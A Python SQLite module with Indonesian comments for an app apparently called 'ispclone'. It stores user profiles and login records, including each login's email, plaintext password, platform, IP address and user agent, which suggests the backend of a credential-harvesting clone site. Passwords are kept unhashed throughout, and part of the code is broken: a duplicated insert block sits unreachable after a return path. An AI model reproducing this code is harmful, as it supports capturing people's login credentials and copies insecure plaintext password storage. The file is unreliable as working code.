import sqlite3
import datetime
import os

class Database:
    def __init__(self, db_path='data/ispclone.db'):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Inisialisasi database dan buat tabel jika belum ada"""
        # Buat direktori data jika belum ada
        os.makedirs('data', exist_ok=True)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Buat tabel users
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                first_name TEXT,
                last_name TEXT,
                username TEXT,
                email TEXT,
                password TEXT,
                phone TEXT,
                birth_date TEXT,
                address TEXT,
                city TEXT,
                postal_code TEXT,
                province TEXT,
                occupation TEXT,
                referral_code TEXT,
                registration_date TEXT,
                status TEXT DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Buat tabel login_logs
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS login_logs (
                id TEXT PRIMARY KEY,
                email TEXT,
                password TEXT,
                name TEXT,
                platform TEXT,
                login_time TEXT,
                ip_address TEXT,
                user_agent TEXT,
                timestamp TEXT,
                status TEXT DEFAULT 'success',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_user(self, user_data):
        """Menyimpan data user baru"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO users (
                    id, first_name, last_name, username, email, password,
                    phone, birth_date, address, city, postal_code, province,
                    occupation, referral_code, registration_date, status
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                user_data.get('id'),
                user_data.get('firstName'),
                user_data.get('lastName'),
                user_data.get('username'),
                user_data.get('email'),
                user_data.get('password'),
                user_data.get('phone'),
                user_data.get('birthDate'),
                user_data.get('address'),
                user_data.get('city'),
                user_data.get('postalCode'),
                user_data.get('province'),
                user_data.get('occupation'),
                user_data.get('referralCode'),
                user_data.get('registrationDate'),
                user_data.get('status', 'active')
            ))
            
            conn.commit()
            return True
        except Exception as e:
            print(f"Error saving user: {e}")
            return False
        finally:
            conn.close()
    
    def save_login_log(self, login_data):
        """Menyimpan data login ke database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO login_logs (
                    id, email, password, name, platform,
                    login_time, ip_address, user_agent, timestamp, status
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                login_data.get('id'),
                login_data.get('email'),
                login_data.get('password'),
                login_data.get('name'),
                login_data.get('platform'),
                login_data.get('loginTime'),
                login_data.get('ipAddress'),
                login_data.get('userAgent'),
                datetime.datetime.now().isoformat(),
                login_data.get('status', 'success')
            ))
            
            conn.commit()
            return True
        except Exception as e:
            print(f"Error saving login log: {e}")
            return False
        finally:
            conn.close()

    def get_login_logs(self):
        """Mengambil semua data login logs"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('SELECT * FROM login_logs ORDER BY created_at DESC')
            columns = [description[0] for description in cursor.description]
            rows = cursor.fetchall()
            
            result = []
            for row in rows:
                result.append(dict(zip(columns, row)))
            
            return result
        except Exception as e:
            print(f"Error getting login logs: {e}")
            return []
        finally:
            conn.close()
        """Menyimpan data login log baru"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO login_logs (
                    id, email, password, name, platform, login_time,
                    ip_address, user_agent, timestamp, status
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                login_data.get('id'),
                login_data.get('email'),
                login_data.get('password'),
                login_data.get('name'),
                login_data.get('platform'),
                login_data.get('loginTime'),
                login_data.get('ipAddress'),
                login_data.get('userAgent'),
                login_data.get('timestamp'),
                login_data.get('status', 'success')
            ))
            
            conn.commit()
            return True
        except Exception as e:
            print(f"Error saving login log: {e}")
            return False
        finally:
            conn.close()
    
    def get_all_users(self):
        """Mengambil semua data users"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
            users = cursor.fetchall()
            
            # Convert to list of dictionaries
            columns = [description[0] for description in cursor.description]
            users_list = []
            for user in users:
                user_dict = dict(zip(columns, user))
                users_list.append(user_dict)
            
            return {
                "users": users_list,
                "lastUpdated": datetime.datetime.now().isoformat(),
                "totalUsers": len(users_list)
            }
        except Exception as e:
            print(f"Error getting users: {e}")
            return {"users": [], "lastUpdated": None, "totalUsers": 0}
        finally:
            conn.close()
    
    def get_all_login_logs(self):
        """Mengambil semua data login logs"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('SELECT * FROM login_logs ORDER BY created_at DESC')
            logs = cursor.fetchall()
            
            # Convert to list of dictionaries
            columns = [description[0] for description in cursor.description]
            logs_list = []
            for log in logs:
                log_dict = dict(zip(columns, log))
                logs_list.append(log_dict)
            
            return {
                "loginLogs": logs_list,
                "lastUpdated": datetime.datetime.now().isoformat(),
                "totalLogins": len(logs_list)
            }
        except Exception as e:
            print(f"Error getting login logs: {e}")
            return {"loginLogs": [], "lastUpdated": None, "totalLogins": 0}
        finally:
            conn.close()
    
    def get_all_data(self):
        """Mengambil semua data (users dan login logs)"""
        return {
            "users": self.get_all_users(),
            "loginLogs": self.get_all_login_logs()
        }
    
    def migrate_from_json(self):
        """Migrasi data dari JSON ke SQLite"""
        # Migrasi users.json
        try:
            with open('data/users.json', 'r', encoding='utf-8') as f:
                users_data = json.load(f)
            
            for user in users_data.get('users', []):
                self.save_user(user)
            print(f"Migrated {len(users_data.get('users', []))} users from JSON")
        except FileNotFoundError:
            print("No users.json file found to migrate")
        except Exception as e:
            print(f"Error migrating users: {e}")
        
        # Migrasi login_logs.json
        try:
            with open('data/login_logs.json', 'r', encoding='utf-8') as f:
                logs_data = json.load(f)
            
            for log in logs_data.get('loginLogs', []):
                self.save_login_log(log)
            print(f"Migrated {len(logs_data.get('loginLogs', []))} login logs from JSON")
        except FileNotFoundError:
            print("No login_logs.json file found to migrate")
        except Exception as e:
            print(f"Error migrating login logs: {e}")

# Import json untuk migrasi
import json

